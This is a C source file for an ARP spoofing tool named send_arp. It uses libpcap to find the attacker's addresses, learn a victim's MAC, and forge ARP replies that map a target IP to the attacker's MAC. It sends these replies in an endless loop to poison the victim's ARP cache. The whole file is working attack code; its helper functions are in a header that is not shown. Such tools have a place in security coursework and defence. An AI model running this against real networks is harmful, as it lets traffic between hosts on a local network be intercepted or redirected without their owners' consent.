/* Copyright © 2018 James Sung. All rights reserved. */

#include "functions.h"

// ./send_arp <interface> <sender ip> <target ip>
int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		PRINT_USAGE();
		puts("[*] Exiting program with -1");
		return -1;
	}
	
	puts("[+] Running program...\n");
	
	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "[-] Couldn't open device %s: %s\n", dev, errbuf);
		puts("[*] Exiting program with -1");
		return -1;
	}

	char                attacker_IP_char[16];
	struct in_addr     *attacker_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t            attacker_IP_int;
	uint8_t            *attacker_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	struct in_addr     *sender_IP_struct = (struct in_addr *)calloc(1, sizeof(struct in_addr));
	uint32_t            sender_IP_int;
	uint8_t            *sender_MAC_array = (uint8_t *)calloc(1, 6 * sizeof(uint8_t));

	struct in_addr     *target_IP_struct = (struct in_addr *)calloc(1, sizeof(in_addr));
	uint32_t            target_IP_int;

	struct pcap_pkthdr *header = (struct pcap_pkthdr *)calloc(1, sizeof(struct pcap_pkthdr));
	const uint8_t      *packet;

	my_etharp_hdr      *arp_request        = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));
	uint8_t            *arp_request_packet = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));

	my_etharp_hdr      *arp_reply          = (my_etharp_hdr *)calloc(1, sizeof(my_etharp_hdr));
	uint8_t            *arp_reply_packet   = (uint8_t *)calloc(1, sizeof(my_etharp_hdr));	


	inet_aton(argv[3], target_IP_struct);
	target_IP_int = target_IP_struct->s_addr;
	
/* get attacker ip address */
	GET_MY_IP(attacker_IP_char, dev);
	printf("[Attacker IP  Address] "); PRINT_IP(attacker_IP_char);
	puts("");
	
	inet_aton(attacker_IP_char, attacker_IP_struct);
	attacker_IP_int = attacker_IP_struct->s_addr;

/* get attacker mac address */
	GET_MY_MAC(attacker_MAC_array, dev);
	printf("[Attacker MAC Address] "); PRINT_MAC(attacker_MAC_array);
	puts(""); puts("");

/* send arp request broadcast */
	printf("[Sender   IP  Address] %s", argv[2]);
	puts(""); puts("");

	inet_aton(argv[2], sender_IP_struct);
	sender_IP_int = sender_IP_struct->s_addr;

	printf("[+] Creating ARP request packet: ");
	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, sender_IP_int);
	STRUCT2PACKET(arp_request_packet, arp_request);
	puts("Done");

	printf("[+] Broadcasting ARP request, 5 times: ");
	for (int i = 0; i < 5; i++)
	{
		if (pcap_sendpacket(handle, arp_request_packet, sizeof(my_etharp_hdr)))
		{
			puts("Failed!");
			puts("[-] Failed to send packet");
			puts("[*] Exiting program with -1");
			pcap_perror(handle, 0);	
			return -1;
		}
		sleep(0.1);
	}
	puts("Done");

	printf("[+] Getting sender MAC address from ARP reply packet: ");
	if (!GET_SENDER_MAC(sender_MAC_array, sender_IP_int, handle, header, packet))
	{
		puts("[-] Fail!");
		puts("[-] Exiting with -1");
		return -1;
	}
	puts("DONE"); puts("");

	printf("[Sender   MAC Address] "); PRINT_MAC(sender_MAC_array);
	puts(""); puts("");	

	printf("[+] Creating fake ARP reply packet: ");
	MAKE_ARPREP_STRUCT(arp_reply, attacker_MAC_array, attacker_IP_int, sender_MAC_array, sender_IP_int, target_IP_int);
	STRUCT2PACKET(arp_reply_packet, arp_reply);
	puts("Done");	

	puts("[+] Success!");
	printf("[+] Repetitively sending fake ARP reply to sender: sender <%s> will now identify target <%s> MAC as attacker MAC <", argv[2], argv[3]); PRINT_MAC(attacker_MAC_array); printf(">");
	puts("");

	while (1)
	{
		pcap_sendpacket(handle, arp_reply_packet, sizeof(my_etharp_hdr));
		puts(".");
		sleep(1);
	}


	pcap_close(handle);
	free(attacker_IP_struct); free(attacker_MAC_array);
	free(sender_IP_struct);   free(sender_MAC_array);
	free(target_IP_struct);   free(header);
	free(arp_request);        free(arp_request_packet);
	free(arp_reply);          free(arp_reply_packet);

	puts("[*] Exiting program with 0");

	return 0;
}

